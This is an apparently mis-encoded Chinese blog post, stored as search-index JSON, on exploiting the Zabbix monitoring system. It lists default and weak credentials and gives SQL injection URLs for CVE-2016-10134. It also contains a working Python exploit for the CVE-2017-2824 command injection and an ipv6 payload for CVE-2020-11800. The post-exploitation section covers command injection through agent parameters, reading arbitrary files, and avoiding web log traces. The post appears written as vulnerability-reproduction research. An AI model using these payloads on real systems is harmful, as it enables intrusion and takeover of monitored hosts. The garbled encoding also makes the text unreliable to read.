ç›‘æ§ç³»ç»Ÿçš„å‘Šè­¦ä¸­å¿ƒã€‚åœ¨ç›‘æ§çš„ç³»ç»Ÿä¸­å‡ºç°ä»»ä½•å¼‚å¸¸ï¼Œå°†è¢«å‘å‡ºé€šçŸ¥ç»™ç®¡ç†å‘˜ã€‚Zabbix Server çš„åŠŸèƒ½å¯åˆ†è§£æˆä¸ºä¸‰ä¸ªä¸åŒçš„ç»„ä»¶ï¼Œåˆ†åˆ«ä¸º Zabbix Server æœåŠ¡ã€Web åå°åŠæ•°æ®åº“ã€‚ Zabbix Proxy Zabbix Proxy æ˜¯åœ¨å¤§è§„æ¨¡åˆ†å¸ƒå¼ç›‘æ§åœºæ™¯ä¸­é‡‡ç”¨ä¸€ç§åˆ†æ‹… Zabbix Server å‹åŠ›çš„åˆ†å±‚ç»“æ„ï¼Œå…¶å¤šç”¨åœ¨è·¨æœºæˆ¿ã€è·¨ç½‘ç»œçš„ç¯å¢ƒä¸­ï¼ŒZabbix Proxy å¯ä»¥ä»£æ›¿ Zabbix Server æ”¶é›†æ€§èƒ½å’Œå¯ç”¨æ€§æ•°æ®ï¼Œç„¶åæŠŠæ•°æ®æ±‡æŠ¥ç»™ Zabbix Serverï¼Œå¹¶ä¸”åœ¨ä¸€å®šç¨‹åº¦ä¸Šåˆ†æ‹…äº† Zabbix Server çš„å‹åŠ›ã€‚ Zabbix Agent Zabbix Agent éƒ¨ç½²åœ¨è¢«ç›‘æ§çš„ç›®æ ‡æœºå™¨ä¸Šï¼Œä»¥ä¸»åŠ¨ç›‘æ§æœ¬åœ°èµ„æºå’Œåº”ç”¨ç¨‹åºï¼ˆç¡¬ç›˜ã€å†…å­˜ã€å¤„ç†å™¨ç»Ÿè®¡ä¿¡æ¯ç­‰ï¼‰ã€‚Zabbix Agent æ”¶é›†æœ¬åœ°çš„çŠ¶æ€ä¿¡æ¯å¹¶å°†æ•°æ®ä¸ŠæŠ¥ç»™ Zabbix Server ç”¨äºè¿›ä¸€æ­¥å¤„ç†ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:1:1","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.2 ç½‘ç»œæ¶æ„ å¯¹äº Zabbix Agent å®¢æˆ·ç«¯æ¥è¯´ï¼Œæ ¹æ®è¯·æ±‚ç±»å‹å¯åˆ†ä¸ºè¢«åŠ¨æ¨¡å¼åŠä¸»åŠ¨æ¨¡å¼ï¼š è¢«åŠ¨æ¨¡å¼ï¼šServer å‘ Agent çš„ 10050 ç«¯å£è·å–ç›‘æ§é¡¹æ•°æ®ï¼ŒAgent æ ¹æ®ç›‘æ§é¡¹æ”¶é›†æœ¬æœºæ•°æ®å¹¶å“åº”ã€‚ ä¸»åŠ¨æ¨¡å¼ï¼šAgent ä¸»åŠ¨è¯·æ±‚ Server (Proxy) çš„ 10051 ç«¯å£è·å–ç›‘æ§é¡¹åˆ—è¡¨ï¼Œå¹¶æ ¹æ®ç›‘æ§é¡¹æ”¶é›†æœ¬æœºæ•°æ®æäº¤ç»™ Server (Proxy) ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:1:2","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"1.3 Zabbix Agent é…ç½® Zabbix Agent æœåŠ¡çš„é…ç½®æ–‡ä»¶ä¸º zabbix_agentd.confï¼ŒLinux é»˜è®¤è·¯å¾„åœ¨ /etc/zabbix/zabbix_agentd.confã€‚ é…ç½®æ–‡ä»¶ä¸­åŒ…å«çš„ä¸€äº›åŸºæœ¬è®¾ç½®é€‰é¡¹ï¼š Server å‚æ•° Server æˆ– Proxy çš„ IPã€CIDRã€åŸŸåç­‰ï¼ŒAgent ä»…æ¥å—æ¥è‡ª Server å‚æ•°çš„ IP è¯·æ±‚ï¼ˆç™½åå•ï¼‰ã€‚ ServerActive å‚æ•° Server æˆ– Proxy çš„ IPã€CIDRã€åŸŸåç­‰ï¼Œç”¨äºä¸»åŠ¨æ¨¡å¼ï¼ŒAgent ä¸»åŠ¨å‘ ServerActive å‚æ•°çš„ IP å‘é€è¯·æ±‚ã€‚ StartAgents å‚æ•° zabbix å¯åŠ¨ä¹‹åå¼€å¯è¢«åŠ¨ç›‘æ§çš„è¿›ç¨‹æ•°é‡ï¼Œé»˜è®¤ä¸º3ã€‚å¦‚æœè®¾ç½®ä¸º 0ï¼Œé‚£ä¹ˆ zabbix è¢«åŠ¨ç›‘æ§è¢«ç¦ç”¨ï¼Œå¹¶ä¸”ä¸ä¼šç›‘å¬ 10050 ç«¯å£ã€‚ é…ç½®æ–‡ä»¶ä¸­åŒ…å«çš„ä¸€äº›å¯èƒ½å­˜åœ¨é£é™©çš„è®¾ç½®é€‰é¡¹ï¼š Include å‚æ•° åŠ è½½é…ç½®æ–‡ä»¶ç›®å½•å•ä¸ªæ–‡ä»¶æˆ–æ‰€æœ‰æ–‡ä»¶ï¼Œé€šå¸¸åŒ…å«çš„ conf éƒ½æ˜¯é…ç½® UserParameter è‡ªå®šä¹‰ç”¨æˆ·å‚æ•°ã€‚ UserParameter å‚æ•° è‡ªå®šä¹‰ç”¨æˆ·å‚æ•°ï¼Œæ ¼å¼ä¸ºUserParameter=\u003ckey\u003e,\u003ccommand\u003eï¼ŒServer å¯å‘ Agent æ‰§è¡Œé¢„è®¾çš„è‡ªå®šä¹‰å‚æ•°å‘½ä»¤ä»¥è·å–ç›‘æ§æ•°æ®ï¼Œä»¥å®˜æ–¹ç¤ºä¾‹ä¸ºä¾‹ï¼š UserParameter=ping[*],echo $1 å½“ Server å‘ Agent æ‰§è¡Œ ping[aaaa] æŒ‡ä»¤æ—¶ï¼Œ$1 ä¸ºä¼ å‚çš„å€¼ï¼ŒAgent ç»è¿‡æ‹¼æ¥ä¹‹åæ‰§è¡Œçš„å‘½ä»¤ä¸ºecho aaaaï¼Œæœ€ç»ˆæ‰§è¡Œç»“æœä¸ºaaaaã€‚ command å­˜åœ¨å‘½ä»¤æ‹¼æ¥ï¼Œä½†ç”±äºä¼ å‚å†…å®¹å— UnsafeUserParameters å‚æ•°é™åˆ¶ï¼Œé»˜è®¤æ— æ³•ä¼ å‚ç‰¹æ®Šç¬¦å·ï¼Œæ‰€ä»¥é»˜è®¤é…ç½®åˆ©ç”¨åœºæ™¯æœ‰é™ã€‚ UnsafeUserParameters å‚æ•° è‡ªå®šä¹‰ç”¨æˆ·å‚æ•°æ˜¯å¦å…è®¸ä¼ å‚ä»»æ„å­—ç¬¦ï¼Œé»˜è®¤ä¸å…è®¸å­—ç¬¦ \\ ' \" `` * ? [ ] { } ~ $ ! \u0026 ; ( ) \u003c \u003e | # @ï¼Œå½“ UnsafeUserParameters=1 æ—¶ï¼Œå…è®¸ç‰¹æ®Šå­—ç¬¦ã€‚ ä»¥ UserParameter=ping[*],echo $1 ä¸ºä¾‹ï¼Œå‘ Agent æ‰§è¡ŒæŒ‡ä»¤ ping[test \u0026\u0026 whoami]ï¼Œç»è¿‡å‘½ä»¤æ‹¼æ¥åæœ€ç»ˆæ‰§è¡Œ echo test \u0026\u0026 whoamiï¼ŒæˆåŠŸæ³¨å…¥æ‰§è¡Œ shell å‘½ä»¤ã€‚ EnableRemoteCommands å‚æ•° æ˜¯å¦å…è®¸æ¥è‡ª Zabbix Server çš„è¿œç¨‹å‘½ä»¤ï¼Œå¼€å¯åå¯é€šè¿‡ Server ä¸‹å‘ shell è„šæœ¬åœ¨ Agent ä¸Šæ‰§è¡Œã€‚å½“å€¼ä¸º 1 æ—¶ï¼Œå…è®¸è¿œç¨‹ä¸‹å‘å‘½ä»¤ã€‚ AllowRoot å‚æ•° Linux é»˜è®¤ä»¥ä½æƒé™ç”¨æˆ· zabbix è¿è¡Œï¼Œå¼€å¯åä»¥ root æƒé™è¿è¡Œ zabbix_agentd æœåŠ¡ã€‚å½“å…¶å€¼ä¸º 1 æ—¶ï¼Œå…è®¸ä»¥ root æƒé™æ‰§è¡Œå‘½ä»¤ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:1:3","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"2 Zabbix å†å²æ¼æ´ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:2:0","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.1 å¼±å£ä»¤ 2.1.1 Web ç«¯ Zabbix å®‰è£…åè‡ªå¸¦ Admin ç®¡ç†å‘˜ç”¨æˆ·å’Œ Guests è®¿å®¢ç”¨æˆ·ï¼ˆä½ç‰ˆæœ¬ï¼‰ï¼Œå¯ç™»é™† Zabbiax åå°ã€‚ å¸¸è§å¼±å£ä»¤ç»„åˆï¼š admin:zabbix Admin:zabbix guset:ç©ºå£ä»¤ 2.1.2 mysql ç«¯ ç”±äº root ç”¨æˆ·é»˜è®¤æƒ…å†µä¸‹æ— æ³•å¤–è¿ï¼Œè¿ç»´é€šå¸¸ä¼šæ–°å»º MySQL ç”¨æˆ· zabbixï¼Œå¸¸è§å¯†ç å¦‚ä¸‹ï¼š 123456 zabbix zabbix123 zabbix1234 zabbix12345 zabbix123456 æ‹¿ä¸‹ MySQL æ•°æ®åº“åï¼Œå¯è§£å¯† users è¡¨çš„å¯†ç  md5 å€¼ï¼Œæˆ–è€…ç›´æ¥æ›¿æ¢å¯†ç çš„ md5 ä¸ºå·²çŸ¥å¯†ç ï¼Œå³å¯ç™»å½• Zabbix Webã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:2:1","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.2 CVE-2016-10134 - SQL æ³¨å…¥æ¼æ´ è¯¥æ¼æ´çš„å…·ä½“åˆ†æå¯å‚è€ƒï¼šzabbix SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2016-10134ï¼‰ï¼ŒåŸç†æ˜¯ insert æ’å…¥æ—¶æœªå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥è¿›è¡Œæ˜¾é”™æ³¨å…¥ã€‚ 2.2.1 å·²æœ‰ç”¨æˆ·å‡­æ® ä»¥ Guest ç”¨æˆ·ç™»å½•åï¼ŒæŸ¥çœ‹ Cookie ä¸­çš„zbx_sessionidï¼Œå¤åˆ¶å 16 ä½å­—ç¬¦ï¼š å°†è¿™ 16 ä¸ªå­—ç¬¦ä½œä¸º sid çš„å€¼ï¼Œè®¿é—® http://your-ip:8080/latest.php?output=ajax\u0026sid=16ä½ ID\u0026favobj=toggle\u0026toggle_open_state=1\u0026toggle_ids[]=updatexml(0,concat(0xa,user()),0)ï¼Œå¯è§æˆåŠŸæ³¨å…¥ï¼š 2.2.2 æ— ç”¨æˆ·å‡­æ® è¿™ä¸ªæ¼æ´ä¹Ÿå¯ä»¥é€šè¿‡ jsrpc.php è§¦å‘ï¼Œä¸”æ— éœ€ç™»å½•ï¼šhttp://IP:8080/jsrpc.php?type=0\u0026mode=1\u0026method=screen.get\u0026profileIdx=web.item.graph\u0026resourcetype=17\u0026profileIdx2=updatexml(0,concat(0xa,user()),0)ï¼š å°†ç”¨æˆ·å¯†ç  MD5 è¿˜åŸå³å¯ç™»å½•ã€‚æ¼æ´åˆ©ç”¨è„šæœ¬ï¼šzabbixPwn ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:2:2","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.3 CVE-2017-2824 - å‘½ä»¤æ³¨å…¥ åˆ©ç”¨è¯¥æ¼æ´ï¼Œéœ€è¦æœåŠ¡ç«¯å¼€å¯äº†è‡ªåŠ¨æ³¨å†ŒåŠŸèƒ½ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»¥ç®¡ç†å‘˜çš„èº«ä»½å¼€å¯è‡ªåŠ¨æ³¨å†ŒåŠŸèƒ½ã€‚ä½¿ç”¨è´¦å·å¯†ç  admin/zabbix ç™»å½•åå°ï¼Œè¿›å…¥ Configuration-\u003eActionsï¼Œå°† Event source è°ƒæ•´ä¸º Auto registrationï¼Œç„¶åç‚¹å‡» Create actionï¼Œåˆ›å»ºä¸€ä¸ª Actionï¼Œåå­—éšæ„ï¼š ç¬¬ä¸‰ä¸ªæ ‡ç­¾é¡µï¼Œåˆ›å»ºä¸€ä¸ª Operationï¼Œtypeæ˜¯ Add Hostï¼š ä¿å­˜ã€‚è¿™æ ·å°±å¼€å¯äº†è‡ªåŠ¨æ³¨å†ŒåŠŸèƒ½ï¼Œæ”»å‡»è€…å¯ä»¥å°†è‡ªå·±çš„æœåŠ¡å™¨æ³¨å†Œä¸º Agentã€‚ ç¬¬ä¸€æ¡æ•°æ®ï¼š active checksæ˜¯ Agent ä¸»åŠ¨æ£€æŸ¥æ—¶ç”¨äºè·å–ç›‘æ§é¡¹åˆ—è¡¨çš„å‘½ä»¤ï¼ŒZabbix Server åœ¨å¼€å¯è‡ªåŠ¨æ³¨å†Œçš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ active checks å‘½ä»¤è¯·æ±‚è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„ host æ—¶ï¼Œè‡ªåŠ¨æ³¨å†Œæœºåˆ¶ä¼šå°† json è¯·æ±‚ä¸­çš„ hostã€ip æ·»åŠ åˆ° interface æ•°æ®è¡¨é‡Œã€‚ {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\";touch /tmp/success\"})) ç¬¬äºŒæ¡æ•°æ®ï¼š {\"request\":\"command\",\"scriptid\":1,\"hostid\":10001} command æŒ‡ä»¤å¯ä»¥åœ¨æœªæˆæƒçš„æƒ…å†µä¸‹å¯æŒ‡å®šä¸»æœº (hostid) æ‰§è¡ŒæŒ‡å®šè„šæœ¬ (scriptid)ï¼ŒZabbix å­˜åœ¨ 3 ä¸ªé»˜è®¤è„šæœ¬ï¼Œè„šæœ¬ä¸­çš„ {HOST.CONN} åœ¨è„šæœ¬è°ƒç”¨çš„æ—¶å€™ä¼šè¢«æ›¿æ¢æˆä¸»æœº IPã€‚ # scriptid == 1 == /bin/ping -c {HOST.CONN} 2\u003e\u00261 # scriptid == 2 == /usr/bin/traceroute {HOST.CONN} 2\u003e\u00261 # scriptid == 3 == sudo /usr/bin/nmap -O {HOST.CONN} 2\u003e\u00261 scriptid æŒ‡å®šå…¶ä¸­ä»»æ„ä¸€ä¸ªï¼Œhostid ä¸ºæ³¨å…¥æ¶æ„ Payload åçš„ä¸»æœº idï¼Œä½†è‡ªåŠ¨æ³¨å†Œåçš„ hostid æ˜¯æœªçŸ¥çš„ï¼Œæ‰€ä»¥é€šè¿‡ command æŒ‡ä»¤éå† hostid çš„æ–¹å¼éƒ½æ‰§è¡Œä¸€éï¼Œæœ€åæˆåŠŸè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚ ç”±äºé»˜è®¤è„šæœ¬çš„ç±»å‹é™åˆ¶ï¼Œè„šæœ¬éƒ½æ˜¯åœ¨ Zabbix Server ä¸Šè¿è¡Œï¼ŒZabbix Proxy æ˜¯æ— æ³•ä½¿ç”¨ command æŒ‡ä»¤çš„ã€‚payload é•¿åº¦å—é™åˆ¶å¯æ‹†åˆ†å¤šæ¬¡æ‰§è¡Œï¼Œå¿…é¡»æ›´æ¢ host åç§°ä»¥æ‰§è¡Œæ–°çš„payloadã€‚ EXP å¦‚ä¸‹ï¼š import sys import socket import json import sys def send(ip, data): conn = socket.create_connection((ip, 10051), 10) conn.send(json.dumps(data).encode()) data = conn.recv(2048) conn.close() return data target = sys.argv[1] print(send(target, {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\";touch /tmp/success\"})) for i in range(10000, 10500): data = send(target, {\"request\":\"command\",\"scriptid\":1,\"hostid\":str(i)}) if data and b'failed' not in data: print('hostid: %d' % i) print(data) ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:2:3","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"2.4 CVE-2020-11800 - å‘½ä»¤æ³¨å…¥ è¯¥æ¼æ´ä¸ºåŸºäº CVE-2017-2824 çš„ç»•è¿‡åˆ©ç”¨ã€‚æœªæˆæƒæ”»å‡»è€…å‘ Zabbix Server çš„ 10051 ç«¯å£å‘é€ trapper åŠŸèƒ½ç›¸å…³å‘½ä»¤ï¼Œåˆ©ç”¨æ¼æ´å³å¯åœ¨ Zabbix Server ä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ å…¶ä¸­ CVE-2020-11800 æ¼æ´é€šè¿‡ ipv6 æ ¼å¼ç»•è¿‡ ip å­—æ®µæ£€æµ‹æ³¨å…¥æ‰§è¡Œ shell å‘½ä»¤ï¼Œå—æ•°æ®è¡¨å­—æ®µé™åˆ¶ Payload é•¿åº¦åªèƒ½ä¸º 64 ä¸ªå­—ç¬¦ã€‚ {\"request\":\"active checks\",\"host\":\"vulhub\",\"ip\":\"ffff:::;whoami\"} ç”±äº CVE-2017-2824 ä¸ CVE-2020-11800 æ¼æ´ç‚¹åŠåˆ©ç”¨åŒºåˆ«ä¸å¤§ï¼Œä¸å†å¤è¿°ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:2:4","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3 Zabbix åæ¸—é€æµ‹è¯• åœ¨æ‹¥æœ‰ Zabbix Server æƒé™åï¼Œå¦‚ä½•åˆ©ç”¨å½“å‰æƒé™è¿›ä¸€æ­¥æ§åˆ¶ Zabbix Agentï¼Ÿå‰æ–‡è®²åˆ°ï¼ŒZabbix Agent çš„ 10050 ç«¯å£ä»…å¤„ç†æ¥è‡ª Zabbix Server æˆ– Proxy çš„è¯·æ±‚ï¼Œæ‰€ä»¥åç»­æ”»å‡»éƒ½æ˜¯ä¾èµ–äº Zabbix Server æƒé™è¿›è¡Œæ‰©å±•ã€‚ åœ¨ zabbix ä¸­ï¼Œæˆ‘ä»¬è¦ç›‘æ§çš„æŸä¸€ä¸ªæŒ‡æ ‡ï¼Œè¢«ç§°ä¸ºâ€œç›‘æ§é¡¹â€ï¼Œå°±åƒæˆ‘ä»¬çš„ç£ç›˜ä½¿ç”¨ç‡ï¼Œåœ¨ zabbix ä¸­å°±å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªâ€œç›‘æ§é¡¹â€(item)ï¼Œå¦‚æœè¦è·å–åˆ°â€œç›‘æ§é¡¹â€çš„ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬åˆ™è¦æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨å‘½ä»¤ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªâ€œåˆ«åâ€å»è°ƒç”¨å‘½ä»¤ï¼Œè¿™ä¸ªâ€œå‘½ä»¤åˆ«åâ€åœ¨ zabbix ä¸­è¢«ç§°ä¸ºâ€œé”®â€(key)ï¼Œæ‰€ä»¥åœ¨ zabbix ä¸­ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦è·å–åˆ°ä¸€ä¸ªâ€œç›‘æ§é¡¹â€çš„å€¼ï¼Œåˆ™éœ€è¦æœ‰å¯¹åº”çš„â€œé”®â€ï¼Œé€šè¿‡â€œé”®â€èƒ½å¤Ÿè°ƒç”¨ç›¸åº”çš„å‘½ä»¤ï¼Œè·å–åˆ°å¯¹åº”çš„ç›‘æ§ä¿¡æ¯ã€‚ åœ¨æ§åˆ¶ Zabbix Server æƒé™çš„æƒ…å†µä¸‹å¯é€šè¿‡ zabbix_get å‘½ä»¤å‘ Agent è·å–ç›‘æ§é¡¹æ•°æ®ï¼Œæ¯”å¦‚è¯´è·å– Agent çš„ç³»ç»Ÿå†…æ ¸ä¿¡æ¯ï¼š å…³äºç›‘æ§é¡¹ï¼Œå¯ä»¥å‚è€ƒï¼š Agentç›‘æ§é¡¹è¾ƒå¤šä¸ä¸€ä¸€ä¾‹ä¸¾ï¼Œå¯ä»¥å‚è€ƒï¼š 1. Zabbix Agentç›‘æ§é¡¹ 2. Zabbix Agent Windowsç›‘æ§é¡¹ é’ˆå¯¹ item ç›‘æ§é¡¹çš„æ”»å‡»é¢è¿›è¡ŒæŒ–æ˜ï¼Œå­˜åœ¨ä»¥ä¸‹åˆ©ç”¨åœºæ™¯ï¼š ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:0","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3.1 EnableRemoteCommands å‚æ•°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ å‰æ–‡è®²åˆ°ï¼ŒAgent è¿œç¨‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤éœ€è¦åœ¨ zabbix_agentd.conf é…ç½®æ–‡ä»¶ä¸­å¼€å¯ EnableRemoteCommands å‚æ•°ã€‚ åœ¨ Zabbix Web ä¸Šæ·»åŠ è„šæœ¬ï¼ŒExecute on é€‰é¡¹å¯æ ¹æ®éœ€æ±‚é€‰æ‹©ï¼Œé€‰æ‹© Zabbix server ä¸éœ€è¦å¼€å¯ EnableRemoteCommands å‚æ•°ï¼Œæ‰€ä»¥ä¸€èˆ¬æ§åˆ¶ Zabbix Web åå¯é€šè¿‡è¯¥æ–¹å¼åœ¨ Zabbix Server ä¸Šæ‰§è¡Œå‘½ä»¤æ‹¿åˆ°æœåŠ¡å™¨æƒé™ã€‚ å¦‚æœè¦æŒ‡å®šæŸä¸ªä¸»æœºæ‰§è¡Œè¯¥è„šæœ¬ï¼Œå¯ä» Zabbix Web çš„â€œç›‘æµ‹ä¸­ -\u003e æœ€æ–°æ•°æ®â€åŠŸèƒ½ä¸­æ ¹æ®è¿‡æ»¤æ¡ä»¶æ‰¾åˆ°æƒ³è¦æ‰§è¡Œè„šæœ¬çš„ä¸»æœºï¼Œå•å‡»ä¸»æœºåå³å¯åœ¨å¯¹åº” Agent ä¸Šæ‰§è¡Œè„šæœ¬ã€‚ å¦‚æœç±»å‹æ˜¯ Execute on Zabbix Agent ï¼ŒAgent é…ç½®æ–‡ä»¶åœ¨æœªå¼€å¯ EnableRemoteCommands å‚æ•°çš„æƒ…å†µä¸‹ä¼šè¿”å›æŠ¥é”™ã€‚ å¦‚æœä¸æƒ³åœ¨ Zabbix Web ä¸Šç•™ä¸‹å¤ªå¤šæ—¥å¿—ç—•è¿¹ï¼Œæˆ–è€…æƒ³æ‰¹é‡æ§åˆ¶ Agentï¼Œæ‹¿ä¸‹ Zabbix Server æƒé™åå¯ä»¥é€šè¿‡ zabbix_get å‘½ä»¤å‘ Agent æ‰§è¡Œç›‘æ§é¡¹å‘½ä»¤ï¼Œåœ¨ Zabbix Web æ‰§è¡Œè„šæœ¬å®é™…ä¸Šç­‰äºæ‰§è¡Œ system.run ç›‘æ§é¡¹å‘½ä»¤ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:1","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3.2 UserParameter è‡ªå®šä¹‰å‚æ•°å‘½ä»¤æ³¨å…¥ å½“ Zabbiax Agent çš„ zabbix_agentd.conf é…ç½®æ–‡ä»¶å¼€å¯ UnsafeUserParameters å‚æ•°çš„æƒ…å†µä¸‹ï¼Œä¼ å‚å€¼å­—ç¬¦ä¸å—é™åˆ¶ï¼Œåªéœ€è¦æ‰¾åˆ°å­˜åœ¨ä¼ å‚çš„è‡ªå®šä¹‰å‚æ•° UserParameterï¼Œå°±èƒ½è¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„æ•ˆæœã€‚ ä»¥ä¸‹é¢é…ç½®ä¸ºä¾‹ï¼š zabbix_get -s agent -p 10050 -k \"ping[test \u0026\u0026 id]\" ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:2","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3.3 ä»»æ„æ–‡ä»¶è¯»å– Zabbix Agent å¦‚æœæ²¡æœ‰é…ç½®ä¸å½“çš„é—®é¢˜ï¼Œæ˜¯å¦æœ‰å…¶ä»–å§¿åŠ¿å¯ä»¥åˆ©ç”¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚ Zabbix åŸç”Ÿç›‘æ§é¡¹ä¸­ï¼Œvfs.file.contentså‘½ä»¤å¯ä»¥è¯»å–æŒ‡å®šæ–‡ä»¶ï¼Œä½†æ— æ³•è¯»å–è¶…è¿‡ 64KB çš„æ–‡ä»¶ã€‚ zabbix_agentd æœåŠ¡é»˜è®¤ä»¥ä½æƒé™ç”¨æˆ· zabbix è¿è¡Œï¼Œè¯»å–æ–‡ä»¶å— zabbix ç”¨æˆ·æƒé™é™åˆ¶ã€‚å¼€å¯ AllowRoot å‚æ•°æƒ…å†µä¸‹ zabbix_agentd æœåŠ¡ä¼šä»¥ root æƒé™è¿è¡Œï¼Œåˆ©ç”¨ vfs.file.contents å‘½ä»¤å°±èƒ½ä»»æ„æ–‡ä»¶è¯»å–ã€‚ å¦‚æœæ–‡ä»¶è¶…è¿‡ 64KB æ— æ³•è¯»å–ï¼Œåœ¨äº†è§£è¯¥æ–‡ä»¶å­—æ®µæ ¼å¼çš„æƒ…å†µä¸‹å¯åˆ©ç”¨ vfs.file.regexp å‘½ä»¤æ­£åˆ™è·å–å…³é”®å†…å®¹ã€‚ ","date":"2022-03-21","objectID":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/:3:3","tags":["Zabbix","æ¼æ´å¤ç°"],"title":"Zabbix æ¼æ´æ·±å…¥åˆ©ç”¨","uri":"/2022/03/zabbix%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%85%A5%E5%88%A9%E7%94%A8/"},{"categories":["æ¼æ´å¤ç°"],"content":"3.4 Windows ç›®å½•éå† ZabbixåŸç”Ÿç›‘æ§é¡¹ä¸­ï¼Œwmi.get å‘½ä»¤å¯ä»¥æ‰§è¡Œ WMI 